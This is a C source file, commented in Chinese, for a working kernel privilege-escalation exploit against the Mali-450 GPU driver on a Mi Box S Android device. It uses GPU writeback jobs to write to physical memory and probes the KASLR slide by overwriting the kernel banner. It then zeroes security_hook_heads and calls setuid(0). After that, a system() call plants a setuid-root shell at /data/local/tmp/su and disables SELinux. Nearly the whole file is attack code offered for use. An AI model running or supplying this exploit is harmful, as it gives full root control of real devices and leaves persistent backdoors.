/*
 * kort_root4.c - Mi Box S (oneday) Mali-450 r10p1 提权 (banner 探针版)
 *
 * 探针: linux_banner (rodata, /proc/version 可读)
 *   VA 0xffffff8009dc0078, PA(0) = 0x01DC0078, 页 0x01DC0000, 页内 0x078
 *   写坏无崩溃风险 (纯字符串), 读它检测写入落地 + 测 KASLR slide
 *
 * 写入原语: WB writeback, 窗口大小 = min(W,H)*16B (kort_dump2 实测
 *   W=H=0x10 -> 256B 窗口), 全窗口写同一 32 位值
 *
 * Cache: GPU 写 DDR, CPU cache stale -> 每次 GPU 写后 touch 24MB 冲刷
 *
 * 提权: security_hook_heads 清零 -> capable() 恒放行 -> setuid(0)
 *   VA 0xffffff800a828120, PA(0)=0x02828120, 页 0x02828000, 页内 0x120
 *   前后无危险符号 (dac_mmap_min_addr / secclass_map)
 *
 * 编译: armv7a-linux-androideabi24-clang kort_root4.c -o kort_root4 -static
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define MALI_IOC_MEM_ALLOC  0xC0288300
#define MALI_IOC_MEM_BIND   0xC0288302
#define MALI_IOC_PP_START_JOB       0xC1988400
#define MALI_IOC_WAIT_FOR_NOTIFICATION 0xC0688202

typedef struct {
    uint64_t ctx; uint32_t gpu_vaddr; uint32_t vsize;
    uint32_t psize; uint32_t flags;
    uint64_t backend_handle; int32_t secure_shared_fd;
} alloc_mem_s;
typedef struct { uint32_t points[3]; int32_t sync_fd; } mali_uk_fence_t;
typedef struct {
    uint64_t ctx; uint64_t user_job_ptr; uint32_t priority;
    uint32_t frame_registers[23];
    uint32_t frame_registers_addr_frame[7];
    uint32_t frame_registers_addr_stack[7];
    uint32_t wb0_registers[12]; uint32_t wb1_registers[12];
    uint32_t wb2_registers[12]; uint32_t dlbu_registers[4];
    uint32_t num_cores; uint32_t perf_counter_flag;
    uint32_t perf_counter_src0; uint32_t perf_counter_src1;
    uint32_t frame_builder_id; uint32_t flush_id; uint32_t flags;
    uint32_t tilesx; uint32_t tilesy; uint32_t heatmap_mem;
    uint32_t num_memory_cookies; uint64_t memory_cookies;
    mali_uk_fence_t fence; uint64_t timeline_point_ptr;
} pp_start_job_s;
typedef struct {
    uint64_t ctx; uint32_t type; uint32_t _pad; uint8_t data[88];
} wait_for_notification_s;

#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR      1
#define FR_FLAGS            3
#define FR_CLEAR_DEPTH      4
#define FR_CLEAR_COLOR_0    6
#define FR_CLEAR_COLOR_1    7
#define FR_CLEAR_COLOR_2    8
#define FR_CLEAR_COLOR_3    9
#define FR_WIDTH           10
#define FR_HEIGHT          11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13
#define FR_DUBYA           18
#define FR_SCALE           21
#define FR_FOUREIGHT       22
#define WB_TYPE 0
#define WB_ADDRESS 1
#define WB_PIXEL_FORMAT 2
#define WB_PITCH 5
#define WB_MRT_BITS 6

#define GPU_VA_DATA  0x40000000u
#define BUF_SIZE     0x4000

/* slide=0 基准地址 */
#define BANNER_PAGE_PA0   0x01DC0000u
#define BANNER_PAGE_OFF   0x078
#define HOOKS_PAGE_PA0    0x02828000u
#define HOOKS_PAGE_OFF    0x120
#define HOOKS_LEN         0xBA0     /* security_hook_heads 大小 */

#define SLIDE_STEP   0x200000u
#define SLIDE_MAX    0x40000000u

static const uint32_t fragment_shader[] = {
    0x00020425, 0x0000000c, 0x01e007cf, 0xb0000000, 0x000005f5,
};
static volatile int g_to = 0;
static void alh(int s) { g_to = 1; }
static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno; alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

/* BIND: _mali_uk_bind_mem_s ctx@0 vaddr@8 size@12 flags@16 pad@20
   phys@24 rights@28 flags@32 */
static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
    uint8_t raw[40];
    memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t vaddr = gpu_va, sz = size, fl = 0x800,
             pa = phys, rights = 0x37;
    memcpy(raw + 0,  &ctx, 8);
    memcpy(raw + 8,  &vaddr, 4);
    memcpy(raw + 12, &sz, 4);
    memcpy(raw + 16, &fl, 4);
    memcpy(raw + 24, &pa, 4);
    memcpy(raw + 28, &rights, 4);
    return tio(fd, MALI_IOC_MEM_BIND, raw, 3);
}

/* 256B 窗口 WB 写 (W=H=0x10) */
static int wb_write256(int fd, uint32_t *buf, uint32_t wb_addr, uint32_t value)
{
    const uint32_t OFF_PLB = 0, OFF_SHADER = 0x80, OFF_RSW = 0x100,
                   OFF_TILEBLK = 0x200, OFF_STACK = 0x1000;
    memset(buf, 0, 0x2000);
    memcpy((uint8_t*)buf + OFF_SHADER, fragment_shader, sizeof(fragment_shader));
    uint32_t *rsw = (uint32_t*)((uint8_t*)buf + OFF_RSW);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = (GPU_VA_DATA + OFF_SHADER) | 5;
    rsw[0x0D] = 0x00000100;
    uint32_t *plb = (uint32_t*)buf;
    plb[0] = 0; plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | (((GPU_VA_DATA + OFF_TILEBLK) >> 3) & ~0xE0000003u);
    plb[3] = 0xB0000000; plb[4] = 0; plb[5] = 0xBC000000;

    pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xCAFEBABE;
    job.num_cores = 1;
    job.frame_registers[FR_PLBU_ARRAY_ADDR] = GPU_VA_DATA + OFF_PLB;
    job.frame_registers[FR_RENDER_ADDR]     = GPU_VA_DATA + OFF_RSW;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_DEPTH]     = 0x00FFFFFF;
    job.frame_registers[FR_CLEAR_COLOR_0]   = value;
    job.frame_registers[FR_CLEAR_COLOR_1]   = value;
    job.frame_registers[FR_CLEAR_COLOR_2]   = value;
    job.frame_registers[FR_CLEAR_COLOR_3]   = value;
    job.frame_registers[FR_WIDTH]           = 0x10;
    job.frame_registers[FR_HEIGHT]          = 0x10;
    job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + OFF_STACK;
    job.frame_registers[FR_FRAG_STACK_SIZE] = 0;
    job.frame_registers[FR_DUBYA]           = 0x77;
    job.frame_registers[FR_SCALE]           = 0x0C;
    job.frame_registers[FR_FOUREIGHT]       = 0x8888;
    job.wb0_registers[WB_TYPE]         = 0x02;
    job.wb0_registers[WB_ADDRESS]      = wb_addr;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;
    job.wb0_registers[WB_PITCH]        = 16;   /* (0x10*4+64)/8 */
    job.wb0_registers[WB_MRT_BITS]     = 4;
    job.fence.sync_fd = -1;
    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;
    __builtin___clear_cache((char*)buf, (char*)buf + 0x2000);

    if (tio(fd, MALI_IOC_PP_START_JOB, &job, 5) != 0) return -1;
    wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    if (tio(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5) != 0) return -2;
    return 0;
}

/* 32B 窗口 WB 写 (W=0x10 H=0x4, kort_dump2 T4 实测) */
static int wb_write32(int fd, uint32_t *buf, uint32_t wb_addr, uint32_t value)
{
    const uint32_t OFF_PLB = 0, OFF_SHADER = 0x80, OFF_RSW = 0x100,
                   OFF_TILEBLK = 0x200, OFF_STACK = 0x1000;
    memset(buf, 0, 0x2000);
    memcpy((uint8_t*)buf + OFF_SHADER, fragment_shader, sizeof(fragment_shader));
    uint32_t *rsw = (uint32_t*)((uint8_t*)buf + OFF_RSW);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = (GPU_VA_DATA + OFF_SHADER) | 5;
    rsw[0x0D] = 0x00000100;
    uint32_t *plb = (uint32_t*)buf;
    plb[0] = 0; plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | (((GPU_VA_DATA + OFF_TILEBLK) >> 3) & ~0xE0000003u);
    plb[3] = 0xB0000000; plb[4] = 0; plb[5] = 0xBC000000;

    pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xCAFEBABE;
    job.num_cores = 1;
    job.frame_registers[FR_PLBU_ARRAY_ADDR] = GPU_VA_DATA + OFF_PLB;
    job.frame_registers[FR_RENDER_ADDR]     = GPU_VA_DATA + OFF_RSW;
    job.frame_registers[FR_FLAGS]           = 0x01;
    job.frame_registers[FR_CLEAR_DEPTH]     = 0x00FFFFFF;
    job.frame_registers[FR_CLEAR_COLOR_0]   = value;
    job.frame_registers[FR_CLEAR_COLOR_1]   = value;
    job.frame_registers[FR_CLEAR_COLOR_2]   = value;
    job.frame_registers[FR_CLEAR_COLOR_3]   = value;
    job.frame_registers[FR_WIDTH]           = 0x10;
    job.frame_registers[FR_HEIGHT]          = 0x4;
    job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + OFF_STACK;
    job.frame_registers[FR_FRAG_STACK_SIZE] = 0;
    job.frame_registers[FR_DUBYA]           = 0x77;
    job.frame_registers[FR_SCALE]           = 0x0C;
    job.frame_registers[FR_FOUREIGHT]       = 0x8888;
    job.wb0_registers[WB_TYPE]         = 0x02;
    job.wb0_registers[WB_ADDRESS]      = wb_addr;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;
    job.wb0_registers[WB_PITCH]        = 16;
    job.wb0_registers[WB_MRT_BITS]     = 4;
    job.fence.sync_fd = -1;
    uint32_t tl = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&tl;
    __builtin___clear_cache((char*)buf, (char*)buf + 0x2000);

    if (tio(fd, MALI_IOC_PP_START_JOB, &job, 5) != 0) return -1;
    wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    if (tio(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif, 5) != 0) return -2;
    return 0;
}

/* CPU cache 冲刷: touch 8MB (S905X L2 512K-1M, 8MB 足够逐出) */
static volatile char *g_flush_buf = NULL;
static size_t g_flush_sz = 0;
static void flush_cpu_cache(void) {
    if (!g_flush_buf) {
        g_flush_sz = 8 * 1024 * 1024;
        g_flush_buf = mmap(NULL, g_flush_sz, PROT_READ|PROT_WRITE,
                           MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        if (g_flush_buf == MAP_FAILED) { g_flush_buf = NULL; return; }
    }
    for (size_t i = 0; i < g_flush_sz; i += 64)
        g_flush_buf[i] = (char)(i >> 6);
}

/* 读 /proc/version 前 8 字节 */
static int read_version(char *out, int n) {
    int fd = open("/proc/version", O_RDONLY);
    if (fd < 0) return -1;
    int r = read(fd, out, n - 1);
    close(fd);
    if (r <= 0) return -1;
    out[r] = 0;
    return 0;
}

int main(int argc, char **argv) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("[*] kort_root4 - banner probe + hook clear + setuid(0)\n");
    printf("[*] uid=%d\n", getuid());

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("[-] open /dev/mali"); return 1; }

    alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.vsize = BUF_SIZE; alloc.psize = BUF_SIZE;
    if (tio(fd, MALI_IOC_MEM_ALLOC, &alloc, 3) != 0) {
        printf("[-] ALLOC failed\n"); return 1;
    }
    void *buf = mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, GPU_VA_DATA);
    if (buf == MAP_FAILED) { printf("[-] mmap\n"); return 1; }

    /* 先预分配 flush buffer (避免扫描途中缺页) */
    flush_cpu_cache();

    /* ---------- 阶段 1: banner 探针扫描 KASLR ---------- */
    char ver[16];
    read_version(ver, sizeof(ver));
    printf("[*] /proc/version: '%.8s...'\n", ver);

    const uint32_t PROBE_VA = 0x41000000u;
    uint32_t slide = 0;
    int found = 0;
    int n_scanned = 0;

    printf("[*] scanning slide (2MB step, max 1GB, 32B window, write 0)...\n");
    for (uint32_t s = 0; s <= SLIDE_MAX; s += SLIDE_STEP) {
        uint32_t va = PROBE_VA + (s / SLIDE_STEP) * 0x1000;
        if (bind_phys(fd, BANNER_PAGE_PA0 + s, va, 0x1000) != 0) continue;
        if (wb_write32(fd, (uint32_t*)buf, va + BANNER_PAGE_OFF, 0) != 0)
            continue;

        flush_cpu_cache();
        n_scanned++;

        char cur[16];
        memset(cur, 1, sizeof(cur));
        if (read_version(cur, sizeof(cur)) == 0 && cur[0] == 0) {
            slide = s; found = 1;
            printf("[+] FOUND slide=0x%08x (banner PA=0x%08x)\n",
                   slide, BANNER_PAGE_PA0 + slide);
            break;
        }
        if (n_scanned % 64 == 0)
            printf("  [*] %d scanned, up to slide 0x%08x\n", n_scanned, s);
    }

    if (!found) {
        printf("[-] slide not found in 1GB\n");
        return 1;
    }

    /* 恢复 banner 前 32 字节 (image 已知内容, 8 dword) */
    {
        static const uint32_t banner_dw[8] = {
            0x756e694c, 0x65762078, 0x6f697372, 0x2e34206e,
            0x36322e39, 0x62612d39, 0x36333534, 0x656a2820,
        };
        uint32_t va = PROBE_VA + (slide / SLIDE_STEP) * 0x1000;
        printf("[*] restoring banner...\n");
        for (int i = 0; i < 8; i++)
            wb_write32(fd, (uint32_t*)buf, va + BANNER_PAGE_OFF + 4 * i, banner_dw[i]);
        flush_cpu_cache();
        char cur[16];
        read_version(cur, sizeof(cur));
        printf("[*] /proc/version now: '%.8s...'\n", cur);
    }

    /* ---------- 阶段 2: 清零 security_hook_heads ---------- */
    printf("[*] clearing security_hook_heads @ PA 0x%08x...\n",
           HOOKS_PAGE_PA0 + slide);
    {
        uint32_t hook_va = 0x42000000u;
        if (bind_phys(fd, HOOKS_PAGE_PA0 + slide, hook_va, 0x2000) != 0) {
            printf("[-] BIND hooks failed\n"); return 1;
        }
        /* 256B 窗口 x 12 = 覆盖 [0x120, 0xC00) > 0xBA0 */
        for (uint32_t off = 0; off < HOOKS_LEN; off += 0x100) {
            int r = wb_write256(fd, (uint32_t*)buf, hook_va + HOOKS_PAGE_OFF + off, 0);
            if (r == -999) { printf("[-] TIMEOUT\n"); return 1; }
        }
        flush_cpu_cache();
        printf("[+] hooks cleared + cache flushed\n");
    }

    munmap(buf, BUF_SIZE);
    close(fd);

    /* ---------- 阶段 3: setuid(0) ---------- */
    printf("[*] trying setuid(0)...\n");
    if (setuid(0) != 0) { setgid(0); setuid(0); }
    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());

    if (getuid() != 0) {
        printf("[-] setuid failed\n");
        return 1;
    }

    printf("\n[+] ========================================\n");
    printf("[+]  ROOT! uid=0\n");
    printf("[+] ========================================\n\n");

    system("id > /data/local/tmp/pwned.txt;"
           "echo PWNED >> /data/local/tmp/pwned.txt;"
           "cp /system/bin/sh /data/local/tmp/su;"
           "chown 0:0 /data/local/tmp/su;"
           "chmod 6755 /data/local/tmp/su;"
           "setenforce 0 2>/dev/null; true");

    if (argc > 1 && strcmp(argv[1], "-s") == 0) {
        char *sh[] = {"/system/bin/sh", NULL};
        execv(sh[0], sh);
    }
    return 0;
}
